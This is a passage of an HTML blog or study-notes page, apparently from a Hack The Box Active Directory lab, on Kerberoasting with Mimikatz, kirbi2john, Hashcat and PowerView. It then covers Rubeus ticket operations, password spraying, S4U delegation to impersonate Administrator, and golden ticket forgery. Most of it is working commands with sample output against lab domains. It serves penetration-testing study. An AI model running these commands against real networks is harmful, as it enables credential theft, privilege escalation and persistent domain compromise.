false</span><br><span class="line">isBase64InterceptOutput is true</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># kerberos::list /export</span></span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">[<span class="number">00000002</span>] - <span class="number">0</span>x00000017 - rc4_hmac_nt</span><br><span class="line">   <span class="built_in">Start</span>/<span class="keyword">End</span>/MaxRenew: <span class="number">2</span>/<span class="number">24</span>/<span class="number">2022</span> <span class="number">3</span>:<span class="number">36</span>:<span class="number">22</span> PM ; <span class="number">2</span>/<span class="number">25</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">55</span>:<span class="number">25</span> AM ; <span class="number">3</span>/<span class="number">3</span>/<span class="number">2022</span> <span class="number">2</span>:<span class="number">55</span>:<span class="number">25</span> PM</span><br><span class="line">   Server Name: MSSQLSvc/DEV<span class="literal">-PRE-SQL</span>.inlanefreight.local:<span class="number">1433</span> <span class="selector-tag">@</span> INLANEFREIGHT.LOCAL</span><br><span class="line">   Client Name: htb<span class="literal">-student</span> <span class="selector-tag">@</span> INLANEFREIGHT.LOCAL</span><br><span class="line">   Flags <span class="number">40</span>a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;</span><br><span class="line">====================</span><br><span class="line">Base64 of file : <span class="number">2</span><span class="literal">-40a10000-htb-student</span>@MSSQLSvc~DEV<span class="literal">-PRE-SQL</span>.inlanefreight.local~<span class="number">1433</span><span class="literal">-INLANEFREIGHT</span>.LOCAL.kirbi</span><br><span class="line">====================</span><br><span class="line">doIGPzCCBjugAwIBBaEDAgEWooIFKDCCBSRhggUgMIIFHKADAgEFoRUbE0lOTEFO</span><br><span class="line">RUZSRUlHSFQuTE9DQUyiOzA5oAMCAQKhMjAwGwhNU1NRTFN2YxskREVWLVBSRS1T</span><br><span class="line">UUwuaW5sYW5lZnJlaWdodC5sb2NhbDoxNDMzo4IEvzCCBLugAwIBF6EDAgECooIE</span><br><span class="line">rQSCBKmBMUn7JhVJpqG0ll7UnRuoeoyRtHxTS8JY1cl6z0M4QbLvJHi0JYZdx1w5</span><br><span class="line">sdzn9Q3tzCn8ipeu+NUaIsVyDuYU/LZG4o2FS83CyLNiu/r2Lc2ZM8Ve/rqdd+TG</span><br><span class="line">xvUkr+<span class="number">5</span>caNrPy2YHKRogzfsO8UQFU1anKW4ztEB1S+f4d1SsLkhYNI4q67cnCy00</span><br><span class="line">UEf4gOF6zAfieo91LDcryDpi1UII0SKIiT0yr9IQGR3TssVnl70acuNac6eCC+Uf</span><br><span class="line">vyd7g9gYH/<span class="number">9</span>aBc8hSBp7RizrAcN2HFCVJontEJmCfBfCk0Ex23G8UULFic1w7S6/</span><br><span class="line">V9yj9iJvOyGElSk1VBRDMhC41712/sTraKRd7rw+fMkx7YdpMoU2dpEj9QQNZ3GR</span><br><span class="line">XNvGyQFkZp+sctI6Yx/vJYBLXI7DloCkzClZkp7c40u+<span class="number">5</span>q/xNby7smpBpLToi5No</span><br><span class="line">ltRmKshJ9W19aAcb4TnPTfr2ZJcBUpf5tEza7wlsjQAlXsPmL3EF2QXQsvOc74Pb</span><br><span class="line">TYEnGPlejJkSnzIHs4a0wy99V779QR4ZwhgUjRkCjrAQPWvpmuI6RU9vOwM50A0n</span><br><span class="line">h580JZiTdZbK2tBorD2BWVKgU/h9h7JYR4S52DBQ7qmnxkdM3ibJD0o1RgdqQO03</span><br><span class="line">TQBMRl9lRiNJnKFOnBFTgBLPAN7jFeLtREKTgiUC1/aFAi5h81aOHbJbXP5aibM4</span><br><span class="line">eLbj2wXp2RrWOCD8t9BEnmat0T8e/O3dqVM52z3JGfHK/<span class="number">5</span>aQ5Us+T5qM9pmKn5v1</span><br><span class="line">XHou0shzgunaYPfKPCLgjMNZ8+<span class="number">9</span>vRgOlry/CgwO/NgKrm8UgJuWMJ/skf9QhD0Uk</span><br><span class="line">T9cUhGhbg3/pVzpTlk1UrP3n+WMCh2Tpm+p7dxOctlEyjoYuQ9iUY4KI6s6ZttT4</span><br><span class="line">tmhBUNua3EMlQUO3fzLr5vvjCd3jt4MF/fD+YFBfkAC4nGfHXvbdQl4E++Ol6/LX</span><br><span class="line">ihGjktgVop70jZRX+<span class="number">2</span>x4DrTMB9+mjC6XBUeIlS9a2Syo0GLkpolnhgMC/ZYwF0r4</span><br><span class="line">MuWZu1/KnPNB16EXaGjZBzeW3/vUjv6ZsiL0J06TBm3mRrPGDR3ZQHLdEh3QcGAk</span><br><span class="line"><span class="number">0</span>Rc4p16+tbeGWlUFIg0PA66m01mhfzxbZCSYmzG25S0cVYOTqjToEgT7EHN0qIhN</span><br><span class="line">yxb2xZp2oAIgBP2SFzS4cZ6GlLoNf4frRvVgevTrHGgba1FA28lKnqf122rkxx+<span class="number">8</span></span><br><span class="line">ECSiW3esAL3FSdZjc9OQZDvo8QB5MKQSTpnU/LYXfb1WafsGFw07inXbmSgWS1Xk</span><br><span class="line">VNCOd/kXsd0uZI2cfrDLK4yg7/ikTR6l/dZ+Adp5BHpKFAb3YfXjtpRM6+<span class="number">1</span>FN56<span class="built_in">h</span></span><br><span class="line">TnoCfIQ/pAXAfIOFohAvB5Z6fLSIP0TuctSqejiycB53N0AWoBGT9bF4409M8tjq</span><br><span class="line"><span class="number">32</span>UeFiVp60IcdOjV4Mwan6tYpLm2O6uwnvw0J+Fmf5x3Mbyr42RZhgQKcwaSTfXm</span><br><span class="line"><span class="number">5</span>oZV57Di6I584CgeD1VN6C2d5sTZyNKjb85lu7M3pBUDDOHQPAD9l4Ovtd8O6Pur</span><br><span class="line">+jWFIa2EXm0<span class="built_in">H</span>/efTTyMR665uahGdYNiZRnpm+ZfCc9LfczUPLWxUOOcaBX/uq6OC</span><br><span class="line">AQEwgf6gAwIBAKKB9gSB832B8DCB7aCB6jCB5zCB5KAbMBmgAwIBF6ESBBB3DAVi</span><br><span class="line">Ys6KmIFpubCAqyQcoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiGDAWoAMCAQGhDzAN</span><br><span class="line">GwtodGItc3R1ZGVudKMHAwUAQKEAAKURGA8yMDIyMDIyNDIzMzYyMlqmERgPMjAy</span><br><span class="line">MjAyMjUwODU1MjVapxEYDzIwMjIwMzAzMjI1NTI1WqgVGxNJTkxBTkVGUkVJR0hU</span><br><span class="line">LkxPQ0FMqTswOaADAgECoTIwMBsITVNTUUxTdmMbJERFVi1QUkUtU1FMLmlubGFu</span><br><span class="line">ZWZyZWlnaHQubG9jYWw6MTQzMw==</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   * Saved to file     : <span class="number">2</span><span class="literal">-40a10000-htb-student</span>@MSSQLSvc~DEV<span class="literal">-PRE-SQL</span>.inlanefreight.local~<span class="number">1433</span><span class="literal">-INLANEFREIGHT</span>.LOCAL.kirbi</span><br></pre></td></tr></table></figure><p>If we don‚Äôt specify the <strong>base64 &#x2F;out:true</strong> command, Mimikatz will extract the tickets and write the to <strong>.kirbi</strong> files. </p><p> Next, you prepare the base blob for cracking <code>echo &quot;&lt;base64 blob&gt;&quot; |  tr -d \\n</code> then place the above into a file and convert it back to a <strong>.kirbi</strong> file using the base64 utility.<code>cat encoded_file | base64 -d &gt; sqldev.kirbi</code></p><p> Extract the kerberos ticket using <a href="http://kirbi2john.py/">kirbi2john.py</a> this will create a file called <strong>crack_file,</strong> which then must be modified to be able to use Hashcat against the hash <code>python2.7 kirbi2john.py sqldev.kirbi</code></p><p>Modifying the crack file for hashcat <code>sed &#39;s/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/&#39; crack_file &gt; sqldev_tgs_hashcat</code> now you can run the ticket through hashcat and get a clear password.</p><h4 id="Skipped-Version"><a href="#Skipped-Version" class="headerlink" title="Skipped Version"></a>Skipped Version</h4><p>So if we decide to skip the base64 output with mimkatz and type <strong>mimikatz # kerberos::list &#x2F;export,</strong> the <strong>.kirbi</strong> file will be written to disk, in this case, you can download the file and run <strong><a href="http://kirbi2john.py/">kirbi2john.py</a></strong> against them directly, skipping the base64 decoding step.</p><h4 id="AUTOMATE-VERSION"><a href="#AUTOMATE-VERSION" class="headerlink" title="AUTOMATE VERSION"></a>AUTOMATE VERSION</h4><p>Using <a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1">PowerView</a> to extract the TGS ticket and convert them to Hashcat format.</p><p><strong>Extracting TGS Ticket</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainUser</span> * <span class="literal">-spn</span> | <span class="built_in">select</span> samaccountname</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-Identity</span> sqldev | <span class="built_in">Get-DomainSPNTicket</span> <span class="literal">-Format</span> Hashcat</span><br></pre></td></tr></table></figure><p><strong>Target Specific User</strong></p><p><code>Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat</code></p><p><strong>Exporting All Tickets to a CSV file and viewing the Content</strong></p><p><code>Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation</code></p><p><code>cat .\ilfreight_tgs.csv</code></p><h2 id="REBEUS"><a href="#REBEUS" class="headerlink" title="REBEUS"></a>REBEUS</h2><p><a href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></p><p>A tool capable of performing kerberoasting faster and easier by providing a variety of options to interact with kerberos</p><p><a href="https://www.hackingarticles.in/a-detailed-guide-on-rubeus/">https://www.hackingarticles.in/a-detailed-guide-on-rubeus/</a></p><h3 id="Ticket-Operations"><a href="#Ticket-Operations" class="headerlink" title="Ticket Operations"></a><strong>Ticket Operations</strong></h3><p>Working in an Active Directory environment depends on various tickets. For example, a Ticket Granting Ticket is an authentication token issued by the KDC which is used to request access from TGS for specific resources.</p><p>In this section, we‚Äôll talk about Rubeus and its capability to play around with tickets.</p><h4 id="Asktgt"><a href="#Asktgt" class="headerlink" title="Asktgt"></a>Asktgt</h4><p>Rubeus can generate raw AS-REQ traffic in order to ask for a TGT with a provided username and password. The password can also be encrypted in RC4, AES or DES encryption and it would still work. Let‚Äôs see an example where a clear-text password is supplied</p><p><code>rubeus.exe asktgt /user:harshitrajpal /password: Password@1</code></p><p> <img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgoZ7cs-QGTlKd5Bzpz77QkG6O6Fi72ldE6ow6UL-XPUd9C67hSeOJi9oqI3KMjzHTeXnrzsh4gfW3_YzzHX-Vo79aphiKA-HUtp49i8dnjHouPnzQQ1Jiwjr9VToCj5KtwWhqgKICUBgw2CTYT47tQELkP85ZBab2vugzQn6WmCr5hj5uZMJ-dITJOhg/s16000/7.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEgoZ7cs-QGTlKd5Bzpz77QkG6O6Fi72ldE6ow6UL-XPUd9C67hSeOJi9oqI3KMjzHTeXnrzsh4gfW3_YzzHX-Vo79aphiKA-HUtp49i8dnjHouPnzQQ1Jiwjr9VToCj5KtwWhqgKICUBgw2CTYT47tQELkP85ZBab2vugzQn6WmCr5hj5uZMJ-dITJOhg&#x2F;s16000&#x2F;7.png?w&#x3D;640&amp;ssl&#x3D;1"></p><p>As you can see above that a KRBTGT has been successfully generated which can be further used to generate TGS. The same can be achieved by providing an encrypted password. Let‚Äôs use a password encrypted with the RC4 cipher.</p><p><code>rubeus.exe asktgt /user:harshitrajpal /rc4:64FBAE31CC352FC26AF97CBDEF151E03</code></p><p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6vfMUCFomJiyWrerwcZuM3nwQpfznhLsINzT8AiGJoXTgS0g42p3tERFo0ub34PI3SLF_XLstk_lq9rrbJE4Vjq6Wfvdho0Ntfs870KbT5wB9Mxk-vHTcAht8sC4fkWmU5YV_0BkOm5ILs9gJ8Nq6euvG-wncjJMfoaTn1fc5MpmzXNXSTjmm2JPc4g/s16000/8.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEi6vfMUCFomJiyWrerwcZuM3nwQpfznhLsINzT8AiGJoXTgS0g42p3tERFo0ub34PI3SLF_XLstk_lq9rrbJE4Vjq6Wfvdho0Ntfs870KbT5wB9Mxk-vHTcAht8sC4fkWmU5YV_0BkOm5ILs9gJ8Nq6euvG-wncjJMfoaTn1fc5MpmzXNXSTjmm2JPc4g&#x2F;s16000&#x2F;8.png?w&#x3D;640&amp;ssl&#x3D;1"></p><p><strong>Asktgs</strong></p><p>Rubeus has an asktgs option which can build raw TGS-REP requests by providing a ticket either in the CLI argument or by providing a path to a ticket.kirbi file placed on disk. Each TGS has a specified purpose.</p><p>For example, let‚Äôs create a TGS for the LDAP service. One or more service SPNs can be provided.</p><p><code>rubeus.exe asktgs /user:harshitrajpal /ticket:doIFNDCCBTCgAwIBB...bA== /service:LDAP/dc1.ignite.local</code><br><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiMI6bD_rWmk3OnNX-A2fyRHpOAOuMB9C_79YtSoJITgwK-vMjtkrKnt8HmLMzt6zM0amwmzw8khiMatpV1CW9XCCRjp-1qhcbIWxz3yDZFfNs04v3DGllEd0ZROjkRqwd1ghVF3WbPCfx6HReUAb67OMvMV7IKrIl4zIa5oEwoIwTjRHSO5EJcNCqPIg/s16000/9.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEiMI6bD_rWmk3OnNX-A2fyRHpOAOuMB9C_79YtSoJITgwK-vMjtkrKnt8HmLMzt6zM0amwmzw8khiMatpV1CW9XCCRjp-1qhcbIWxz3yDZFfNs04v3DGllEd0ZROjkRqwd1ghVF3WbPCfx6HReUAb67OMvMV7IKrIl4zIa5oEwoIwTjRHSO5EJcNCqPIg&#x2F;s16000&#x2F;9.png?w&#x3D;640&amp;ssl&#x3D;1"></p><p>By providing in the TGT we generated in the previous step (copying in notepad and removing enters to type the ticket in a single line) we have generated a TGS successfully.</p><p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZIVjHBOo3oUV7kNLe-E4sPeFKTAwW2e0nUV2BxXFxZ2R_Bni2LUjvkiKIL6o0Ugfs_S5N2Q8f383lwlGR0ZYYEcY0VNeha3W0UHtCM8-LaYDxBDWL8GUww5gK3Bb29OUr5U5FB2trJ4h7A3hJEP6BGlNBjcmbBBnaQ2pGfA1Yq7d0REz4DLydwjMjcw/s16000/10.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEgZIVjHBOo3oUV7kNLe-E4sPeFKTAwW2e0nUV2BxXFxZ2R_Bni2LUjvkiKIL6o0Ugfs_S5N2Q8f383lwlGR0ZYYEcY0VNeha3W0UHtCM8-LaYDxBDWL8GUww5gK3Bb29OUr5U5FB2trJ4h7A3hJEP6BGlNBjcmbBBnaQ2pGfA1Yq7d0REz4DLydwjMjcw&#x2F;s16000&#x2F;10.png?w&#x3D;640&amp;ssl&#x3D;1"></p><h3 id="Klist"><a href="#Klist" class="headerlink" title="Klist"></a>Klist</h3><p>Klist command in Windows can be used to view the tickets generated in the system. Here, when we run klist command we can see that a KRBTGT and an LDAP TGS have been generated and stored in the session.</p><p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhXmMQ3Twpy5cfkNrwiuysEB9XtIXh5Onuq41Bmss3tO8zzDskS2mgte_KiIvRlPd_RyXr0MAFRP1tuBCkp4nZsAnXwW_gvyP0Fc0LsftC28dDE-V4DQIGExLvnrGD37LUhlyzROJIrdVf4hBDa0HNFhlZzjLIzQfedFGmAA3UzYsbDNPP-7dSmT2mL3w/s16000/11.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEhXmMQ3Twpy5cfkNrwiuysEB9XtIXh5Onuq41Bmss3tO8zzDskS2mgte_KiIvRlPd_RyXr0MAFRP1tuBCkp4nZsAnXwW_gvyP0Fc0LsftC28dDE-V4DQIGExLvnrGD37LUhlyzROJIrdVf4hBDa0HNFhlZzjLIzQfedFGmAA3UzYsbDNPP-7dSmT2mL3w&#x2F;s16000&#x2F;11.png?w&#x3D;640&amp;ssl&#x3D;1"></p><h3 id="Renew"><a href="#Renew" class="headerlink" title="Renew"></a>Renew</h3><p>The renew function in Rubeus builds a TGT renewal exchange. We can specify a domain controller using the &#x2F;dc flag which will be used as a destination for the renewal traffic. We can further use the¬†<strong>tgtdeleg</strong>¬†option with this and extract user‚Äôs credentials without elevation and keep it alive on another system for a week by default.</p><p><strong>&#x2F;ptt</strong> flag can also be used in conjunction to apply the Kerberos</p><p><code>rubeus.exe renew /dc:dc1.ignite.local /ticket:doIFNDCCB....bA==</code></p><p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi0GpSeTg61s0HWOXUHdRK5JkiFgSUmbHE6Hu8QPFINoVu4eEqrhwjcHgkE1N0vy8W_JenfEymZ7Wuzom7DSJ6SB_4A-t6xhhM3YXnM8gN0gu8AVq1yI0boCr_kPi_igdmkLF6SXz_42IPOR0qLwkAk6TffeJVnoZkAvNtc6zcQaccR5YRLVheZyn2dfQ/s16000/12.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEi0GpSeTg61s0HWOXUHdRK5JkiFgSUmbHE6Hu8QPFINoVu4eEqrhwjcHgkE1N0vy8W_JenfEymZ7Wuzom7DSJ6SB_4A-t6xhhM3YXnM8gN0gu8AVq1yI0boCr_kPi_igdmkLF6SXz_42IPOR0qLwkAk6TffeJVnoZkAvNtc6zcQaccR5YRLVheZyn2dfQ&#x2F;s16000&#x2F;12.png?w&#x3D;640&amp;ssl&#x3D;1"></p><p><strong>&#x2F;autorenew</strong> sub-function will put the exchange to sleep for endTime 30 minutes and after that window automatically renew the TGT and display the renewed ticket</p><p><code>rubeus.exe renew /dc:dc1.ignite.local /autorenew /ticket:doIFNDCCBTCgAw...bA==</code></p><p> <img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEirxuh_4JAood6FK5wMIFjbbs0mBlJXHHg46gL0FKhJWDkjDN3w9wfsBIexmRzJAtlxXozcTEeCVpU6C46ls0Pfp71GSt6jQTo9ma5H7Vph83B8TsK9lpiHim6VtnmtHOxxdXiLt1dEorn2IWthB-ugOAgUBNXAmseTdzwrlN7MjsNfuW6mQAsP8Y3FJw/s16000/14.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEirxuh_4JAood6FK5wMIFjbbs0mBlJXHHg46gL0FKhJWDkjDN3w9wfsBIexmRzJAtlxXozcTEeCVpU6C46ls0Pfp71GSt6jQTo9ma5H7Vph83B8TsK9lpiHim6VtnmtHOxxdXiLt1dEorn2IWthB-ugOAgUBNXAmseTdzwrlN7MjsNfuW6mQAsP8Y3FJw&#x2F;s16000&#x2F;14.png?w&#x3D;640&amp;ssl&#x3D;1"></p><p>As you may now observe that after a specified time interval a renewed TGT is shown</p><p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj9bgCsSYADAltUs7Q3vRTfTZDSOf9wRunhlIc3WNMZQChVO_iVgdHe8bCNACLVVLt4o4Ewk9U78KMJ3wiuwYiQGmsuWgp0W6T3wLYBVOKmBS7VZjRBPxEZJs_Tx-slKrZI9fPJxIKrhQXu7tbQR3966yrXxlLgVFsOFzb-zOtRAhv2U4Wb1xoa9HuNxQ/s16000/15.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEj9bgCsSYADAltUs7Q3vRTfTZDSOf9wRunhlIc3WNMZQChVO_iVgdHe8bCNACLVVLt4o4Ewk9U78KMJ3wiuwYiQGmsuWgp0W6T3wLYBVOKmBS7VZjRBPxEZJs_Tx-slKrZI9fPJxIKrhQXu7tbQR3966yrXxlLgVFsOFzb-zOtRAhv2U4Wb1xoa9HuNxQ&#x2F;s16000&#x2F;15.png?w&#x3D;640&amp;ssl&#x3D;1"></p><p><strong>Brute</strong></p><p>The brute option in Rubeus can be used to perform a password bruteforce attack against all the existing user accounts in Active Directory. Many times, the same password is used with multiple accounts in real-life enterprise infrastructure. So, brute option can generate multiple TGTs in those accounts having the same password. &#x2F;noticket can be used in conjunction with this option since no ticket is provided with this functionality. For example,</p><p><code>rubeus.exe brute /password:Password@1 /noticket</code></p><p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8INMtJE1du0EspNXMj77ZWTFOnXpqubTigbJ7OEAxdyYRsYdzmFOJ6-4TC9981a5sSh1gSumtK8toDQRacSx-xpU2atrsKCEmiXTlzVuc-WEDEfA_JGRDYtF14fyCnh9rpUCKBdyVKWzgX7BauXZv9MNt-_w1XmV8xOiuN4ZaLpQmy_5xzuuxZDvivA/s16000/16.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEg8INMtJE1du0EspNXMj77ZWTFOnXpqubTigbJ7OEAxdyYRsYdzmFOJ6-4TC9981a5sSh1gSumtK8toDQRacSx-xpU2atrsKCEmiXTlzVuc-WEDEfA_JGRDYtF14fyCnh9rpUCKBdyVKWzgX7BauXZv9MNt-_w1XmV8xOiuN4ZaLpQmy_5xzuuxZDvivA&#x2F;s16000&#x2F;16.png?w&#x3D;640&amp;ssl&#x3D;1"></p><p><strong>Hash</strong></p><p>Rubeus is capable of taking in passwords and generating hashes of them. These are of different formats including NTLM (rc4_hmac) hash. To do this, we can use a¬†<strong>hash</strong>¬†function and provide a domain using &#x2F;domain, an account‚Äôs name (can be a machine account too) using the&#x2F;user flag and the password using &#x2F;password.</p><p><code>rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1</code></p><p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjZwNam6iqN9HFpOVruPYUbfV6Fv4Jdy5rhK3M5jh0bC0T8fCyiuaBZGICX4VpQMH8VgHtHC-W_xc75J_k3fc9VlCPhPjJAwrAYd2EjRxisDx0J7AA0RVzq8v1QSHG9EBQ_vKxFfwqIN8UxppwBCl4X6AlqH31yo_kUhXtwIoC6FMMXQjdIxkj4RM_RXA/s16000/17.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEjZwNam6iqN9HFpOVruPYUbfV6Fv4Jdy5rhK3M5jh0bC0T8fCyiuaBZGICX4VpQMH8VgHtHC-W_xc75J_k3fc9VlCPhPjJAwrAYd2EjRxisDx0J7AA0RVzq8v1QSHG9EBQ_vKxFfwqIN8UxppwBCl4X6AlqH31yo_kUhXtwIoC6FMMXQjdIxkj4RM_RXA&#x2F;s16000&#x2F;17.png?w&#x3D;640&amp;ssl&#x3D;1"></p><p>As you can see 4 different hashes have been output. Various encryption ciphers are used in conjunction with popular hashing techniques. All of these ciphers are supported in AD environment and hence, may be used for different purposes.</p><p><strong>S4u</strong></p><p>We saw above how we can generate hashes using Rubeus. Now let‚Äôs talk about one such attack where hashes can be used to impersonate another user and carry out delegation attacks. For a detailed write-up on delegation, and attacks follow the link¬†<strong><a href="https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/">here</a></strong>. In short, OS post-Windows server 2003 contained a Kerberos protocol extension called s4uself and s4uproxy. These protocols can be used to conduct delegation attacks. For example, in the example below, we have performed an attack called ‚ÄúResource-Based Constrained Delegation‚Äù which benefits the¬†<strong>msDS-AllowedToActOnBehalfOfAnotherIdentity</strong>¬†option set in the attribute‚Äôs editor. Follow the article¬†<strong><a href="https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/">here</a></strong>¬†for a full attack. In the example below, we‚Äôll use the user noob‚Äôs hash and then impersonate Administrator account.</p><ul><li><p>&#x2F;rc4: flag is used to provide user noob‚Äôs account.</p></li><li><p>&#x2F;impersonateuser: User that will be impersonated by noob.</p></li><li><p>&#x2F;msdsspn: A valid msDS-AllowedToActOnBehalfOfAnotherIdentity value for the account. Here, the domain controller</p></li><li><p>&#x2F;altservice: can be supplied to substitute one or more service names in the resulting .kirbi file.</p></li><li><p>&#x2F;ptt: Injects the resulting ticket in the current terminal session</p></li></ul><p><code>rubeus.exe s4u /user:noob$ /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /impersonateuser:Administrator /msdsspn:host/dc1.ignite.local /altservice:cifs /domain:ignite.local /ptt</code></p><p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKaBMUp5U77qh_6bLSEV5bfowSgiBZUnNH2RVGlwxy6mUTG9N64BCvW5gcbsu6DIUNQ2Y3AmFBysTZZBbaXsZSivH7JAfNBMHVF9NjFyNc3_6qdjTyVa2Oh5Y3lkzvTMlMV0NptR-PLeyvgEPczWZdi1gf_AhJm9H_3vq1zXG_68zKek31PTNhtK5QDw/s16000/18.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEiKaBMUp5U77qh_6bLSEV5bfowSgiBZUnNH2RVGlwxy6mUTG9N64BCvW5gcbsu6DIUNQ2Y3AmFBysTZZBbaXsZSivH7JAfNBMHVF9NjFyNc3_6qdjTyVa2Oh5Y3lkzvTMlMV0NptR-PLeyvgEPczWZdi1gf_AhJm9H_3vq1zXG_68zKek31PTNhtK5QDw&#x2F;s16000&#x2F;18.png?w&#x3D;640&amp;ssl&#x3D;1"></p><p>This would generate a ticket for Administrator user over the specified SPN. In short, we can now act as DC.</p><p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUB3Gg2Pl5L3PtqMzd7Q7xa8K50p7yK8r3YqVEj5VgHAcAClYIFIwE4kiN-UcO58nHkB5BjLOOtlEAAIcd86f0oq3_I6K2XCmjkFVZnjDUggjoiycvgi9tOn-iuZ1FeiJY4BoxpP2dfMdC7xFQH7vpG-ahmBvjzVP1_QE6Hlv-LjJqBDnqkIi03zzb6A/s16000/19.png?w=640&ssl=1" alt="https:&#x2F;&#x2F;i0.wp.com&#x2F;blogger.googleusercontent.com&#x2F;img&#x2F;b&#x2F;R29vZ2xl&#x2F;AVvXsEhUB3Gg2Pl5L3PtqMzd7Q7xa8K50p7yK8r3YqVEj5VgHAcAClYIFIwE4kiN-UcO58nHkB5BjLOOtlEAAIcd86f0oq3_I6K2XCmjkFVZnjDUggjoiycvgi9tOn-iuZ1FeiJY4BoxpP2dfMdC7xFQH7vpG-ahmBvjzVP1_QE6Hlv-LjJqBDnqkIi03zzb6A&#x2F;s16000&#x2F;19.png?w&#x3D;640&amp;ssl&#x3D;1"></p><h3 id="Golden-Ticket"><a href="#Golden-Ticket" class="headerlink" title="Golden Ticket"></a>Golden Ticket</h3><p>Golden tickets are forged KRBTGTs (Key Distribution Service account) which can be used to forge other TGTs. This provides an attacker persistence over the domain accounts. For a detailed walkthrough on the topic you can visit the article¬†<strong><a href="https://www.hackingarticles.in/domain-persistence-golden-ticket-attack/">here</a></strong>.</p><p>To forge a golden ticket for user harshitrajpal, we first generate an AES hash (RC4 works too) using the hash command in Rubeus and then using the golden function like so. Here,</p><ul><li><p>&#x2F;ldap: Retrieves information of user over LDAP protocol</p></li><li><p>&#x2F;user: Username whose ticket will be forged</p></li><li><p>&#x2F;printcmd: displays a one liner command that can be used to generate the ticket again that just got generated</p></li></ul><p><code>rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1</code></p><p><code>rubeus.exe golden /aes256:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /ldap /user:harshitrajpal /printcmd</code></p><p><img src="https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPW0OyVNb9deU4qubrM9AEjoOx7201V4pamhV-2Mru0bgQtPYpuvLlJkuOKv4V4mm0Oev2mb8XOF3JccaoZz3xtI5l8psPzgyrBbsYNB8lN3BjcNIVbbiit7B6-ly-ba4JeQ_aKuWgmQp_Vlwgiopb3z763jc82mW25GyqIOdhlWEV8YtqKGQsI6GQVA/s16000/20.png?w=640&ssl=1" 